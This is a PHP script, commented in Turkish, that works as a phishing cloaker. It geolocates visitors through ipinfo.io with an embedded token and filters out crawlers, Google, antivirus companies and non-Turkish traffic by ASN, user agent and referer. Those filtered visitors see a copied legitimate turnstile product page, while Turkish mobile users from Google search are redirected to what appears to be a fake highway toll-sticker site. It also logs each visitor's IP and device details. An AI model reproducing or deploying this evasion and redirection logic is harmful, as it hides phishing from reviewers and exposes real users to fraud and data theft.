<?php
include "analiz.html";
// Cloudflare kullanarak istemci bilgilerini al
if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && !empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
    // Ziyaretçinin gerçek IP adresi Cloudflare tarafından sağlanan başlıktan alınır.
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
} elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && !empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    // Eğer HTTP_CF_CONNECTING_IP başlığı yoksa, X-Forwarded-For başlığını kontrol ederek ziyaretçinin gerçek IP adresini almaya çalışın.
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    // Hem CF_CONNECTING_IP hem de X-Forwarded-For başlıkları yoksa, $_SERVER['REMOTE_ADDR'] kullanılır.
    $ip = $_SERVER['REMOTE_ADDR'];
}
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
$language = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
$referer = $_SERVER['HTTP_REFERER'];
$httpHost = $_SERVER['HTTP_HOST'];
// IPv6 kontrolü
if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
    // Eğer IPv6 ise 502 Bad Gateway hatasını döndür
    header('HTTP/1.1 502 Bad Gateway');
    echo 'Host Not Found or connection failed';
    exit;
} 
$api_url = "https://ipinfo.io/{$ip}?token=c9a3892daa1ecd";
$ch = curl_init($api_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Hata: ' . curl_error($ch);
} 
else 
{
	$data = json_decode($response, true);
    if (isset($data['country'])) {
        $ulke = $data['country'];
    }
    $data = json_decode($response, true);
    if (isset($data['asn']['name']) && (stripos($data['asn']['name'], 'Google') !== false || stripos($data['asn']['name'], 'LLC') !== false)) {
    header('Content-Type: text/html');
    
    // Use cURL to fetch the remote content
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.optima-engineering.com/tr/urunler/kontrollu-gecis-sistemleri/turnikeler/hizli-gecis-turnike-hg-100');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $content = curl_exec($ch);
    curl_close($ch);
    echo $content;
    date_default_timezone_set("Europe/Istanbul");
    $current_date_time = date("H:i:s");
    $file_contents = file_get_contents("iploglari.txt");
    $line_count = count(explode("\n", $file_contents));
    $line_number = $line_count + 1;
    $data = "$line_number - $ip - $userAgent - $ulke - $current_date_time - $language - GOOGLE BOT\n";
    $file = 'iploglari.txt';
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
    exit; // Stop the code here
}  
    elseif (isset($data['company']['name']) && (stripos($data['company']['name'], 'Google') !== false || stripos($data['company']['name'], 'LLC') !== false || stripos($data['company']['name'], 'IRELAND') !== false || stripos($data['company']['name'], 'GOOGLE') !== false || stripos($data['company']['name'], 'TurkNet') !== false || stripos($data['company']['name'], 'AVAST') !== false || stripos($data['company']['name'], 'Ireland') !== false || stripos($data['company']['name'], 'Viettel') !== false || stripos($data['company']['name'], 'CariNet') !== false || stripos($data['company']['name'], 'CariNet') !== false)) 
    {
    header('Content-Type: text/html');
    // Use cURL to fetch the remote content
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.optima-engineering.com/tr/urunler/kontrollu-gecis-sistemleri/turnikeler/hizli-gecis-turnike-hg-100');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $content = curl_exec($ch);
    curl_close($ch);
    echo $content;
        date_default_timezone_set("Europe/Istanbul");
        $current_date_time = date("H:i:s");
        $file_contents = file_get_contents("iploglari.txt");
        $line_count = count(explode("\n", $file_contents));
        $line_number = $line_count + 1;
        $data = "$line_number - $ip - $userAgent - $ulke - $current_date_time - $language - GOOGLE BOT\n";
        $file = 'iploglari.txt';
        file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
        exit; // Kodu burada durdur
    } 
    elseif (isset($data['abuse']['email']) && $data['abuse']['email'] === 'network-abuse@google.com' || $data['abuse']['email'] === 'abuse-tr@vodafone.com') {
    header('Content-Type: text/html');
    // Use cURL to fetch the remote content
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.optima-engineering.com/tr/urunler/kontrollu-gecis-sistemleri/turnikeler/hizli-gecis-turnike-hg-100');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $content = curl_exec($ch);
    curl_close($ch);
    echo $content;
        date_default_timezone_set("Europe/Istanbul");
        $current_date_time = date("H:i:s");
        $file_contents = file_get_contents("iploglari.txt");
        $line_count = count(explode("\n", $file_contents));
        $line_number = $line_count + 1;
        $data = "$line_number - $ip - $userAgent - $ulke - $current_date_time - $language - GOOGLE BOT\n";
        $file = 'iploglari.txt';
        file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
        exit; // Kodu burada durdur
    }
}
curl_close($ch);
// 1. Adım
// Değişkenleri alınan bilgilerle doldurun
$ip = strtolower($ip);
$userAgent = strtolower($userAgent);
$language = strtolower($language);
// "mac", "os",  "15e148",
// 4. Adım
$blockedUserAgents = array("google", "googlebot", "x11", "ucbrowser", "python", "webtech", "compatible", "curl", "spider", "crawler", "mediapartners", "apac", "none", "info", "yandex", "bing", "tiktok", "twitter", "facebook", "sql", "slurp", "duckduckbot", "baiduspider", "yandexbot", "windows", "whatsapp", "telegram", "discord", "crios");
$userAgent = $_SERVER['HTTP_USER_AGENT'];
if (empty($userAgent)) {
    // Useragent bilgisi boşsa bu blok çalışır
    header('Content-Type: text/html');
    // Use cURL to fetch the remote content
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.optima-engineering.com/tr/urunler/kontrollu-gecis-sistemleri/turnikeler/hizli-gecis-turnike-hg-100');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $content = curl_exec($ch);
    curl_close($ch);
    echo $content;
    date_default_timezone_set("Europe/Istanbul");
    $current_date_time = date("H:i:s");
    $file_contents = file_get_contents("iploglari.txt");
    $line_count = count(explode("\n", $file_contents));
    $line_number = $line_count + 1;
    $data = "$line_number - $ip - $userAgent - $ulke - $current_date_time - $language - BOT GIRISI\n";
    $file = 'iploglari.txt';
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
    exit;
} else {
    // Useragent bilgisi dolu ise diğer kontrolü yapabilirsiniz
    foreach ($blockedUserAgents as $blockedAgent) {
        if (stripos($userAgent, $blockedAgent) !== false) {
            // Bloke edilen bir user agenti bulundu
    header('Content-Type: text/html');
    // Use cURL to fetch the remote content
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.optima-engineering.com/tr/urunler/kontrollu-gecis-sistemleri/turnikeler/hizli-gecis-turnike-hg-100');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $content = curl_exec($ch);
    curl_close($ch);
    echo $content;
            date_default_timezone_set("Europe/Istanbul");
            $current_date_time = date("H:i:s");
            $file_contents = file_get_contents("iploglari.txt");
            $line_count = count(explode("\n", $file_contents));
            $line_number = $line_count + 1;
            $data = "$line_number - $ip - $userAgent - $ulke - $current_date_time - $language - BOT GIRISI\n";
            $file = 'iploglari.txt';
            file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
            exit;
        }
    }
}

if ((strpos($referer, "google.com") !== false || strpos($referer, "google.com.tr") !== false) && $ulke === "TR" && (stripos($userAgent, "android") !== false || stripos($userAgent, "iphone") !== false || stripos($userAgent, "ios") !== false) && stripos($language, "tr") !== false)
{
    ob_start();
    // Yönlendirme
    header('Location: https://karayollari-surucuhgsetiket.net/index.php');
    // Çıktı tamponlamayı sonlandır ve herhangi bir çıktıyı sil
    ob_end_clean();
        date_default_timezone_set("Europe/Istanbul");
        $current_date_time = date("H:i:s");
        $file_contents = file_get_contents("iploglari.txt");
        $line_count = count(explode("\n", $file_contents));
        $line_number = $line_count + 1;
        $data = "$line_number - $ip - $userAgent - $ulke - $current_date_time - $language - NORMAL GIRIS\n";
        $file = 'iploglari.txt';
        file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
    exit;
} 

// 3. Adım
if (empty($referer) || strpos($referer, "google.com") === false) {
    header('Content-Type: text/html');
    // Use cURL to fetch the remote content
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.optima-engineering.com/tr/urunler/kontrollu-gecis-sistemleri/turnikeler/hizli-gecis-turnike-hg-100');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $content = curl_exec($ch);
    curl_close($ch);
    echo $content;
    date_default_timezone_set("Europe/Istanbul");
    $current_date_time = date("H:i:s");
    $file_contents = file_get_contents("iploglari.txt");
    $line_count = count(explode("\n", $file_contents));
    $line_number = $line_count + 1;
    $data = "$line_number - $ip - $userAgent - $ulke - $current_date_time - $language -  REFERER Yok\n";
    $file = 'iploglari.txt';
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
    exit;
}
// 5. Adım
if ($ulke !== "TR") {
    header('Content-Type: text/html');
    // Use cURL to fetch the remote content
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.optima-engineering.com/tr/urunler/kontrollu-gecis-sistemleri/turnikeler/hizli-gecis-turnike-hg-100');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $content = curl_exec($ch);
    curl_close($ch);
    echo $content;
        date_default_timezone_set("Europe/Istanbul");
        $current_date_time = date("H:i:s");
        $file_contents = file_get_contents("iploglari.txt");
        $line_count = count(explode("\n", $file_contents));
        $line_number = $line_count + 1;
        $data = "$line_number - $ip - $userAgent - $ulke - $current_date_time - $language - TR DISI GIRIS\n";
        $file = 'iploglari.txt';
        file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
    exit;
}
// 6. Adım
// Manipülasyon kontrolü (örneğin, URL'de istenmeyen karakterler)
if ($_SERVER['REQUEST_URI'] !== urldecode($_SERVER['REQUEST_URI'])) {
    header('Content-Type: text/html');
    // Use cURL to fetch the remote content
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.optima-engineering.com/tr/urunler/kontrollu-gecis-sistemleri/turnikeler/hizli-gecis-turnike-hg-100');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $content = curl_exec($ch);
    curl_close($ch);
    echo $content;
        date_default_timezone_set("Europe/Istanbul");
        $current_date_time = date("H:i:s");
        $file_contents = file_get_contents("iploglari.txt");
        $line_count = count(explode("\n", $file_contents));
        $line_number = $line_count + 1;
        $data = "$line_number - $ip - $userAgent - $ulke - $current_date_time - $language - URL DENEME GIRISI\n";
        $file = 'iploglari.txt';
        file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
    exit;
}
// 7. Adım
// SQL veya XSS kontrolü (örneğin, $_GET veya $_POST verileri)
foreach ($_GET as $key => $value) {
    if (strpos($value, "<script") !== false || strpos($value, "SELECT") !== false) {
    header('Content-Type: text/html');
    // Use cURL to fetch the remote content
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.optima-engineering.com/tr/urunler/kontrollu-gecis-sistemleri/turnikeler/hizli-gecis-turnike-hg-100');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $content = curl_exec($ch);
    curl_close($ch);
    echo $content;
        date_default_timezone_set("Europe/Istanbul");
        $current_date_time = date("H:i:s");
        $file_contents = file_get_contents("iploglari.txt");
        $line_count = count(explode("\n", $file_contents));
        $line_number = $line_count + 1;
        $data = "$line_number - $ip - $userAgent - $ulke - $current_date_time - $language - XSS ATTACK GIRISI\n";
        $file = 'iploglari.txt';
        file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
        exit;
    }
}
// 8. Adım
// 10. Adım
// Tarayıcı konsol kontrolü
if (isset($_SERVER['HTTP_SEC_WEBSOCKET_KEY'])) {
    header('Content-Type: text/html');
    // Use cURL to fetch the remote content
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.optima-engineering.com/tr/urunler/kontrollu-gecis-sistemleri/turnikeler/hizli-gecis-turnike-hg-100');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $content = curl_exec($ch);
    curl_close($ch);
    echo $content;
        date_default_timezone_set("Europe/Istanbul");
        $current_date_time = date("H:i:s");
        $file_contents = file_get_contents("iploglari.txt");
        $line_count = count(explode("\n", $file_contents));
        $line_number = $line_count + 1;
        $data = "$line_number - $ip - $userAgent - $ulke - $current_date_time - $language - MANIPULE DENEME\n";
        $file = 'iploglari.txt';
        file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
        
    exit;
}
// Varsayılan durum
    header('Content-Type: text/html');
    // Use cURL to fetch the remote content
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.optima-engineering.com/tr/urunler/kontrollu-gecis-sistemleri/turnikeler/hizli-gecis-turnike-hg-100');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $content = curl_exec($ch);
    curl_close($ch);
    echo $content;
        date_default_timezone_set("Europe/Istanbul");
        $current_date_time = date("H:i:s");
        $file_contents = file_get_contents("iploglari.txt");
        $line_count = count(explode("\n", $file_contents));
        $line_number = $line_count + 1;
        $data = "$line_number - $ip - $userAgent - $ulke - $current_date_time - $language - DIGER TURLU GIRISI\n";
        $file = 'iploglari.txt';
        file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
exit;
?>
